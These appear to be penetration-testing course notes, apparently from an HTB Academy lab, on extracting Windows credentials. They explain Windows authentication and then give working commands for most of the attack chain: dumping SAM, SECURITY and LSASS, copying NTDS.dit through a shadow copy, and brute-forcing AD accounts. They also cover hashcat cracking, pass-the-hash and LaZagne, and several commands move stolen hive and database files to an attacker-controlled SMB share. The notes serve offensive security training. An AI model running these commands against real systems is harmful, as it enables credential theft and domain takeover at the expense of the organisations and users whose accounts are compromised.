# Extracting Passwords from Windows Systems

## 1.Windows Authentication Process

**Windows authentication process diagram**

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FjOa8lgdN2TtlMpN0CtID%2Fimage.png?alt=media&amp;token=7e849bea-7b28-4564-baaa-edfd9337ba6d" alt=""><figcaption></figcaption></figure>

**LSASS**

| **Authentication Packages** | **Description**                                                                                                                                                                                                                                                |
| --------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Lsasrv.dll`                | The LSA Server service both enforces security policies and acts as the security package manager for the LSA. The LSA contains the Negotiate function, which selects either the NTLM or Kerberos protocol after determining which protocol is to be successful. |
| `Msv1_0.dll`                | Authentication package for local machine logons that don't require custom authentication.                                                                                                                                                                      |
| `Samsrv.dll`                | The Security Accounts Manager (SAM) stores local security accounts, enforces locally stored policies, and supports APIs.                                                                                                                                       |
| `Kerberos.dll`              | Security package loaded by the LSA for Kerberos-based authentication on a machine.                                                                                                                                                                             |
| `Netlogon.dll`              | Network-based logon service.                                                                                                                                                                                                                                   |
| `Ntdsa.dll`                 | This library is used to create new records and folders in the Windows registry.                                                                                                                                                                                |

**SAM database**

The [Security Account Manager](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc756748\(v=ws.10\)?redirectedfrom=MSDN) (`SAM`) is a database file in Windows operating systems that stores user account credentials. It is used to authenticate both local and remote users and uses cryptographic protections to prevent unauthorized access. User passwords are stored as hashes in the registry, typically in the form of either `LM` or `NTLM` hashes. The SAM file is located at `%SystemRoot%\system32\config\SAM` and is mounted under `HKLM\SAM`. Viewing or accessing this file requires `SYSTEM` level privileges.

Windows systems can be assigned to either a workgroup or domain during setup. If the system has been assigned to a workgroup, it handles the SAM database locally and stores all existing users locally in this database. However, if the system has been joined to a domain, the Domain Controller (`DC`) must validate the credentials from the Active Directory database (`ntds.dit`), which is stored in `%SystemRoot%\ntds.dit`.

To improve protection against offline cracking of the SAM database, Microsoft introduced a feature in Windows NT 4.0 called `SYSKEY` (`syskey.exe`). When enabled, SYSKEY partially encrypts the SAM file on disk, ensuring that password hashes for all local accounts are encrypted with a system-generated key.

**Credential Manager**

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FupCrJZbhrIiYuW7QFHyg%2Fimage.png?alt=media&amp;token=bad639f5-968c-4fa8-b9b7-dac026455c06" alt=""><figcaption></figcaption></figure>

Credential Manager is a built-in feature of all Windows operating systems that allows users to store and manage credentials used to access network resources, websites, and applications. These saved credentials are stored per user profile in the user's `Credential Locker`. The credentials are encrypted and stored at the following location:

```powershell-session
PS C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\
```

**NTDS**

`NTDS.dit` is a database file that stores Active Directory data, including but not limited to:

* User accounts (username & password hash)
* Group accounts
* Computer accounts
* Group policy objects

## 2.Attacking SAM, SYSTEM, and SECURITY

### Registry hives

| Registry Hive   | Description                                                                                                                                                       |
| --------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `HKLM\SAM`      | Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.                                        |
| `HKLM\SYSTEM`   | Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.                                                |
| `HKLM\SECURITY` | Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more. |

### Using reg.exe to copy registry hives

* By launching `cmd`

```cmd-session
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
```

If we're only interested in dumping the hashes of local users, we need only `HKLM\SAM` and `HKLM\SYSTEM`. However, it's often useful to save `HKLM\SECURITY` as well, since it can contain cached domain user credentials on domain-joined systems, along with other valuable data

### Creating a share with smbserver

```shell-session
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

* Once the share is running on our attack host, we can use the `move` command on the Windows target to transfer the hive copies to the share.

**Moving hive copies to share**

```cmd-session
C:\> move sam.save \\10.10.15.16\CompData
C:\> move security.save \\10.10.15.16\CompData
C:\> move system.save \\10.10.15.16\CompData
```

```shell-session
ls

sam.save  security.save  system.save
```

### Dumping hashes with secretsdump

```shell-session
locate secretsdump 
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

* follow this line's output

```shell-session
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
```

### Cracking hashes with Hashcat

```shell-session
sudo vim hashestocrack.txt
```

### **Running Hashcat against NT hashes**

```shell-session
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

### DCC2 hashes

`hklm\security` contains cached domain logon information, specifically in the form of DCC2 hashes. These are local, hashed copies of network credential hashes. An example is:

```
inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```

* The Hashcat mode for cracking DCC2 hashes is `2100`.

```shell-session
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```

### DPAPI

the `machine and user keys` for `DPAPI` were also dumped from `hklm\security`. The Data Protection Application Programming Interface, or [DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection), is a set of APIs in Windows operating systems used to encrypt and decrypt data blobs on a per-user basis. These blobs are utilized by various Windows OS features and third-party applications. Below are just a few examples of applications that use DPAPI and how they use it:

| Applications                | Use of DPAPI                                                                                |
| --------------------------- | ------------------------------------------------------------------------------------------- |
| `Internet Explorer`         | Password form auto-completion data (username and password for saved sites).                 |
| `Google Chrome`             | Password form auto-completion data (username and password for saved sites).                 |
| `Outlook`                   | Passwords for email accounts.                                                               |
| `Remote Desktop Connection` | Saved credentials for connections to remote machines.                                       |
| `Credential Manager`        | Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more. |

* DPAPI encrypted credentials can be decrypted manually with tools like Impacket's [dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py), [mimikatz](https://github.com/gentilkiwi/mimikatz), or remotely with [DonPAPI](https://github.com/login-securite/DonPAPI).

```cmd-session
C:\Users\Public> mimikatz.exe
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

### Remote dumping & LSA secrets

**Dumping LSA secrets remotely**

```shell-session
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

**Dumping SAM Remotely**

```shell-session
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

## 3.Attacking LSASS

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FPdaJtERJE49G9dX6RjOy%2Fimage.png?alt=media&amp;token=f54135e1-531a-4a48-950f-af54f5e848c7" alt=""><figcaption></figcaption></figure>

Upon initial logon, LSASS will:

* Cache credentials locally in memory
* Create [access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
* Enforce security policies
* Write to Windows' [security log](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)

## Dumping LSASS process memory

### Task Manager method

With access to an interactive graphical session on the target, we can use task manager to create a memory dump. This requires us to:

1. Open `Task Manager`
2. Select the `Processes` tab
3. Find and right click the `Local Security Authority Process`
4. Select `Create dump file`

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F2dyYEiBnpFMZhZTroGNp%2Fimage.png?alt=media&amp;token=e7adb9d7-1657-4690-b7c3-36216011b1d3" alt=""><figcaption></figcaption></figure>

A file called `lsass.DMP` is created and saved in `%temp%`. This is the file we will transfer to our attack host.&#x20;

***

### Rundll32.exe & Comsvcs.dll method

**Finding LSASS's PID in cmd**

* &#x20;we can issue the command `tasklist /svc` to find `lsass.exe` and its process ID.

```cmd-session
C:\Windows\system32> tasklist /svc
```

**Finding LSASS's PID in PowerShell**

```powershell-session
PS C:\Windows\system32> Get-Process lsass
```

**Creating a dump file using PowerShell**

```powershell-session
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

With this command, we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which also calls the MiniDumpWriteDump (`MiniDump`) function to dump the LSASS process memory to a specified directory (`C:\lsass.dmp`).&#x20;

If we manage to run this command and generate the `lsass.dmp` file, we can proceed to transfer the file onto our attack box to attempt to extract any credentials that may have been stored in LSASS process memory.

***

### Using Pypykatz to extract credentials

```shell-session
pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
```

Lets take a more detailed look at some of the useful information in the output.

* [MSV](https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database.&#x20;
* `WDIGEST` is an older authentication protocol enabled by default in `Windows XP` - `Windows 8` and `Windows Server 2003` - `Windows Server 2012`. LSASS caches credentials used by WDIGEST in clear-text.&#x20;
* [Kerberos](https://web.mit.edu/kerberos/#what_is) is a network authentication protocol used by Active Directory in Windows Domain environments.&#x20;
* LSASS caches `passwords`, `ekeys`, `tickets`, and `pins` associated with Kerberos.&#x20;
* Mimikatz and Pypykatz can extract the DPAPI `masterkey` for logged-on users whose data is present in LSASS process memory. These masterkeys can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts.

### Cracking the NT Hash with Hashcat

```shell-session
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

## 4.Attacking Windows Credential Manager

### Windows Vault and Credential Manager

[Credential Manager](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication#windows-vault-and-credential-manager) is a feature built into Windows since `Server 2008 R2` and `Windows 7`. Thorough documentation on how it works is not publicly available, but essentially, it allows users and applications to securely store credentials relevant to other systems and websites. Credentials are stored in special encrypted folders on the computer under the user and system profiles

* `%UserProfile%\AppData\Local\Microsoft\Vault\`
* `%UserProfile%\AppData\Local\Microsoft\Credentials\`
* `%UserProfile%\AppData\Roaming\Microsoft\Vault\`
* `%ProgramData%\Microsoft\Vault\`
* `%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\`

Each vault folder contains a `Policy.vpol` file with AES keys (AES-128 or AES-256) that is protected by DPAPI. These AES keys are used to encrypt the credentials. Newer versions of Windows make use of `Credential Guard` to further protect the DPAPI master keys by storing them in secured memory enclaves

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FkNXsrM7jDMdRO0Hs9bY9%2Fimage.png?alt=media&amp;token=4ee54957-d97c-4bc3-8fcd-9425429d73fa" alt=""><figcaption></figcaption></figure>

It is possible to export Windows Vaults to `.crd` files either via Control Panel or with the following command. Backups created this way are encrypted with a password supplied by the user, and can be imported on other Windows systems.

```cmd-session
C:\Users\sadams>rundll32 keymgr.dll,KRShowKeyMgr
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F94xH8LFygeMZ6KJwXlm6%2Fimage.png?alt=media&amp;token=50a3ddd0-c335-461d-8c50-3499efd5c663" alt=""><figcaption></figcaption></figure>

## Enumerating credentials with cmdkey

```cmd-session
C:\Users\sadams>whoami
srv01\sadams

C:\Users\sadams>cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02hejubrtyqjrkfi
    Local machine persistence

    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles
```

Stored credentials are listed with the following format:

| Key         | Value                                                                                                                                                      |
| ----------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Target      | The resource or account name the credential is for. This could be a computer, domain name, or a special identifier.                                        |
| Type        | The kind of credential. Common types are `Generic` for general credentials, and `Domain Password` for domain user logons.                                  |
| User        | The user account associated with the credential.                                                                                                           |
| Persistence | Some credentials indicate whether a credential is saved persistently on the computer; credentials marked with `Local machine persistence` survive reboots. |

The first credential in the command output above, `virtualapp/didlogical`, is a generic credential used by Microsoft account/Windows Live services.&#x20;

The second credential, `Domain:interactive=SRV01\mcharles`, is a domain credential associated with the user SRV01\mcharles. `Interactive` means that the credential is used for interactive logon sessions.

Whenever we come across this type of credential, we can use <mark style="color:red;">runas</mark> to impersonate the stored user like so:

```cmd-session
C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F9tfLLTKHEdJaszEImkmv%2Fimage.png?alt=media&amp;token=92c40a6e-b20a-420c-bcbd-89241888cf2e" alt=""><figcaption></figcaption></figure>

## Extracting credentials with Mimikatz

```cmd-session
C:\Users\Administrator\Desktop> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::credman
```

Note: Some other tools which may be used to enumerate and extract stored credentials included [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI), [LaZagne](https://github.com/AlessandroZ/LaZagne), and [DonPAPI](https://github.com/login-securite/DonPAPI).

***

## 5.Attacking Active Directory and NTDS.dit

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FyNg1RjNqxIVl1zEnlvqX%2Fimage.png?alt=media&amp;token=25f87f66-50fb-40a0-a54a-e144a93a7330" alt=""><figcaption></figcaption></figure>

### Dictionary attacks against AD accounts using NetExec

| Username convention                 | Practical example for `Jane Jill Doe` |
| ----------------------------------- | ------------------------------------- |
| `firstinitiallastname`              | jdoe                                  |
| `firstinitialmiddleinitiallastname` | jjdoe                                 |
| `firstnamelastname`                 | janedoe                               |
| `firstname.lastname`                | jane.doe                              |
| `lastname.firstname`                | doe.jane                              |
| `nickname`                          | doedoehacksstuff                      |

## Creating a custom list of usernames

Let's say we have done our research and gathered a list of names based on publicly available information.

```
cat usernames.txt

Ben Williamson
Bob Burgerstien
Jim Stevenson
Jill Johnson
Jane Doe
```

### Create custom wordlists with Username Anarchy

{% embed url="<https://github.com/urbanadventurer/username-anarchy>" %}

```shell-session
./username-anarchy -i /home/ltnbob/names.txt 
```

### **Enumerating valid usernames with Kerbrute**

```shell-session
 ./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
```

### **Launching a brute-force attack with NetExec**

```shell-session
netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

**Event logs from the attack**

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FP78bJPddPASzgSIOlA97%2Fimage.png?alt=media&amp;token=fc69709a-b3f5-4f61-875c-e0e4322704a0" alt=""><figcaption></figcaption></figure>

## Capturing NTDS.dit

### Connecting to a DC with Evil-WinRM

```shell-session
evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

### **Checking local group membership**

Once connected, we can check to see what privileges `bwilliamson` has.

```shell-session
*Evil-WinRM* PS C:\> net localgroup
```

### **Checking user account privileges including domain**

We are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, we need local admin (`Administrators group`) or Domain Admin (`Domain Admins group`) (or equivalent) rights.

```shell-session
*Evil-WinRM* PS C:\> net user bwilliamson
```

if the account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the NTDS.dit file.<br>

### **Creating shadow copy of C:**

* We can use `vssadmin` to create a [Volume Shadow Copy](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (`VSS`) of the `C:` drive or whatever volume the admin chose when initially installing AD.

```shell-session
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
```

### **Copying NTDS.dit from the VSS**

```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

> Note: As was the case with `SAM`, the hashes stored in `NTDS.dit` are encrypted with a key stored in `SYSTEM`. In order to successfully extract the hashes, one must download both files.

### **Transferring NTDS.dit to attack host**

```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
```

### **Extracting hashes from NTDS.dit**

```shell-session
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

## A faster method: Using NetExec to capture NTDS.dit

```shell-session
netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
```

### Cracking hashes and gaining credentials

```shell-session
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

* What if we are unsuccessful in cracking a hash?

## Pass the Hash (PtH)

```shell-session
evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

## 6.Credential Hunting in Windows

### Search-centric

**Key terms to search for**

* Passwords
* Passphrases
* Keys
* Username
* User account
* Creds
* Users
* Passkeys
* configuration
* dbcredential
* dbpassword
* pwd
* Login
* Credentials

### Search tools

**Windows Search**

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F4tl4wiGvKyfJMUrvI3Dy%2Fimage.png?alt=media&amp;token=41e8bb18-531a-41fd-839f-ef442591ab53" alt=""><figcaption></figcaption></figure>

### LaZagne

* We can also take advantage of third-party tools like [LaZagne](https://github.com/AlessandroZ/LaZagne) to quickly discover credentials that web browsers or other installed applications may insecurely store.
* LaZagne is made up of `modules` which each target different software when looking for passwords

| Module   | Description                                                                                       |
| -------- | ------------------------------------------------------------------------------------------------- |
| browsers | Extracts passwords from various browsers including Chromium, Firefox, Microsoft Edge, and Opera   |
| chats    | Extracts passwords from various chat applications including Skype                                 |
| mails    | Searches through mailboxes for passwords including Outlook and Thunderbird                        |
| memory   | Dumps passwords from memory, targeting KeePass and LSASS                                          |
| sysadmin | Extracts passwords from the configuration files of various sysadmin tools like OpenVPN and WinSCP |
| windows  | Extracts Windows-specific credentials targeting LSA secrets, Credential Manager, and more         |
| wifi     | Dumps WiFi credentials                                                                            |

> Note: Web browsers are some of the most interesting places to search for credentials, due to the fact that many of them offer built-in credential storage. In the most popular browsers, such as `Google Chrome`, `Microsoft Edge`, and `Firefox`, stored credentials are encrypted. However, many tools for decrypting the various credentials databases used can be found online, such as [firefox\_decrypt](https://github.com/unode/firefox_decrypt) and [decrypt-chrome-passwords](https://github.com/ohyicong/decrypt-chrome-passwords). LaZagne supports `35` different browsers on Windows.

* It would be beneficial to keep a [standalone copy](https://github.com/AlessandroZ/LaZagne/releases/) of LaZagne on our attack host so we can quickly transfer it over to the target. `LaZagne.exe`
* Once `LaZagne.exe` is on the target, we can open command prompt or PowerShell

```cmd-session
C:\Users\bob\Desktop> start LaZagne.exe all
```

> If we used the `-vv` option, we would see attempts to gather passwords from all LaZagne's supported software.&#x20;

### findstr

We can also use [findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr) to search from patterns across many types of files.

```cmd-session
C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

## Additional considerations

Here are some other places we should keep in mind when credential hunting:

* Passwords in Group Policy in the SYSVOL share
* Passwords in scripts in the SYSVOL share
* Password in scripts on IT shares
* Passwords in `web.config` files on dev machines and IT shares
* Password in `unattend.xml`
* Passwords in the AD user or computer description fields
* KeePass databases (if we are able to guess or crack the master password)
* Found on user systems and shares
* Files with names like `pass.txt`, `passwords.docx`, `passwords.xlsx` found on user systems, shares, and [Sharepoint](https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration)
